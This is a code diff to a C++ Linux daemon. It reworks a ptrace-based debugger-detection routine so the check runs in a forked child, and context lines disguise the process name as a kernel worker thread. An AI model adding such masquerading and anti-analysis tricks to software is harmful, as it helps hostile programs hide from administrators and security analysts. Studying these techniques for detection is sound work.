@@ -8,6 +8,7 @@
 #include <sys/ptrace.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 
@@ -17,6 +18,9 @@
 
 // Define a stealthy process name
 #define DAEMON_NAME "kworker/u0:0-events"
+
+constexpr int EXIT_DEBUGGER_DETECTED = 1;
+constexpr int EXIT_PTRACE_ERROR = 2;
 
 void hide_process_name() {
   // Set process name to look like a kernel worker thread
@@ -52,16 +56,40 @@ bool check_tracer_pid() {
 
 // Check if we can ptrace ourselves (fails if already being traced)
 bool check_ptrace_traceme() {
-  if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
-    if (errno == EPERM || errno == EBUSY) {
-      LOGE("Debugger detected! ptrace(PTRACE_TRACEME) failed: %s",
-           strerror(errno));
-      return true;
-    }
-  } else {
-    // If successful, detach so we don't block ourselves
-    ptrace(PTRACE_DETACH, 0, 0, 0);
+  pid_t child = fork();
+  if (child == -1) {
+    PLOGE("fork() failed in check_ptrace_traceme");
+    return false;
   }
+
+  if (child == 0) {
+    // Child: attempt ptrace on itself. If another debugger is attached this
+    // will fail with EPERM/EBUSY. Exit codes are used by the parent.
+    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
+      _exit((errno == EPERM || errno == EBUSY) ? EXIT_DEBUGGER_DETECTED
+                                               : EXIT_PTRACE_ERROR);
+    }
+    // Detach and report success
+    ptrace(PTRACE_DETACH, 0, 0, 0);
+    _exit(0);
+  }
+
+  int status = 0;
+  pid_t waited;
+  do {
+    waited = waitpid(child, &status, 0);
+  } while (waited == -1 && errno == EINTR);
+
+  if (waited == -1) {
+    PLOGE("waitpid failed in check_ptrace_traceme");
+    return false;
+  }
+
+  if (WIFEXITED(status) && WEXITSTATUS(status) == EXIT_DEBUGGER_DETECTED) {
+    LOGE("Debugger detected! ptrace(PTRACE_TRACEME) failed in child");
+    return true;
+  }
+
   return false;
 }
 
